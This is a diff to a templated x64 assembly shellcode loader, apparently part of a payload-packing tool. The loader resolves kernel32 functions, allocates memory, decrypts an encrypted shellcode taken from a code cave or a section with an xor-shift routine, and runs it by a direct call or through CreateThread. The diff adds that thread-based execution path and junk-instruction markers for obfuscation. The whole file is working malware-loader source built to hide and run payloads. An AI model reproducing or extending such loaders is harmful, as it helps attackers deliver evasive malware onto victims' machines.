@@ -12,16 +12,19 @@
 // [rsp+0x30] store address of WaitForSingleObject
 
 entry:
+// ================================ prepare environment ================================
+
   // ensure stack is 16 bytes aligned
-  push rbp
-  mov rbp, rsp
-  and rsp, 0xFFFFFFFFFFFFFFF0
-  push rbp
+  push rbp                                                     {{igi}}
+  mov rbp, rsp                                                 {{igi}}
+  and rsp, 0xFFFFFFFFFFFFFFF0                                  {{igi}}
+  push rbp                                                     {{igi}}
 
   // reserve stack for store variables
-  sub rsp, 0x48
+  sub rsp, 0x48                                                {{igi}}
 
-// get necessary procedure address
+// =============================== get procedure address ===============================
+
 {{if .LackProcedure}}
   // push kernel32 module name to stack
   mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}                 {{igi}}
@@ -232,12 +235,14 @@ entry:
   {{end}}
 {{end}} // LackProcedure
 
+// ================================ prepare memory page ================================
+
   // allocate memory for shellcode
   mov rax, [rsp+0x10]
   xor rcx, rcx
   mov rdx, {{hex .MemRegionSize}}
-  mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
-  mov r9, 0x04    // PAGE_READWRITE
+  mov r8, 0x3000                   // MEM_RESERVE|MEM_COMMIT
+  mov r9, 0x04                     // PAGE_READWRITE
   sub rsp, 0x20
   call rax
   add rsp, 0x20
@@ -279,7 +284,8 @@ entry:
   add rsp, 0x20
   add rsp, 0x10 // restore stack
 
-// read shellcode from different source
+// ================================= prepare shellcode =================================
+
 {{if .CodeCave}}
   // extract encrypted shellcode from code cave
   mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
@@ -327,17 +333,50 @@ entry:
   jnz loop_decrypt
 {{end}} // SectionMode
 
+// ================================== execute shellcode ==================================
+
+{{if .NeedCreateThread}}
+  mov rax, [rsp+0x28]            // address of CreateThread
+  mov r10, [rsp+0x08]            // address of memory page
+  add r10, {{hex .EntryOffset}}  // address of shellcode
+
+  sub rsp, 0x10                  // reserve stack for argument
+  xor rcx, rcx                   // lpThreadAttributes
+  xor rdx, rdx                   // dwStackSize
+  mov r8, r10                    // lpStartAddress
+  xor r9, r9                     // lpParameter
+  mov [rsp+0], rcx               // dwCreationFlags
+  mov [rsp+8], rcx               // lpThreadId
+
+  sub rsp, 0x20                  // reserve stack for call convention
+  call rax                       // call CreateThread
+  add rsp, 0x20                  // restore stack for call convention
+
+  add rsp, 0x10                  // restore stack for argument
+
+  {{if .NeedWaitThread}}
+    mov rcx, rax                 // hHandle, hThread
+    mov rdx, 0xFFFFFFFF          // dwMilliseconds, INFINITE
+    mov rax, [rsp+0x30]          // address of WaitForSingleObject
+
+    sub rsp, 0x20                // reserve stack for call convention
+    call rax                     // call WaitForSingleObject
+    add rsp, 0x20                // restore stack for call convention
+  {{end}}
+{{else}}
   // get the shellcode entry point
   mov {{.RegV.rax}}, [rsp+0x08]
   add {{.RegV.rax}}, {{hex .EntryOffset}}
-
   // call the shellcode
   sub rsp, 0x20
   call {{.RegV.rax}}
   add rsp, 0x20
+{{end}}
+
+// ================================== clean environment ==================================
 
   // restore stack for store variables
-  add rsp, 0x48
+  add rsp, 0x48                                                {{igi}}
 
   // restore stack and rbp
   pop rbp                                                      {{igi}}
@@ -348,13 +387,13 @@ entry:
   {{db .EndOfLoader}}
 
 xor_shift:
-  mov {{.RegV.r8}}, {{.RegV.rax}}
-  shl {{.RegV.r8}}, 13
-  xor {{.RegV.rax}}, {{.RegV.r8}}
-  mov {{.RegV.r8}}, {{.RegV.rax}}
-  shr {{.RegV.r8}}, 7
-  xor {{.RegV.rax}}, {{.RegV.r8}}
-  mov {{.RegV.r8}}, {{.RegV.rax}}
-  shl {{.RegV.r8}}, 17
-  xor {{.RegV.rax}}, {{.RegV.r8}}
-  ret
+  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
+  shl {{.RegV.r8}}, 13                                         {{igi}}
+  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{igi}}
+  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
+  shr {{.RegV.r8}}, 7                                          {{igi}}
+  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{igi}}
+  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
+  shl {{.RegV.r8}}, 17                                         {{igi}}
+  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{igi}}
+  ret                                                          {{igi}}
